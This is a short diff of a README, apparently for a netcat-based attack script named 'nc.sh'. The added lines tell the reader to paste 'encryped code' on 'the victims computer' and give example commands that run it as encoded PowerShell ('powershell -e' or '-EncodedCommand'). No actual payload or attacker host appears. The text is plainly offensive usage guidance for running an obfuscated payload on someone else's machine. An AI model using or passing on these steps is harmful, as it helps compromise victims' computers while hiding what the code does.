@@ -14,3 +14,5 @@ chmod +x nc.sh
 ```
 bash nc.sh
 ```
+## Copy the encryped code and paste it on the victims computer
+#### Ex:- powershell -e "encrypt code here" or powershell -EncodedCommand "encrypt code here"
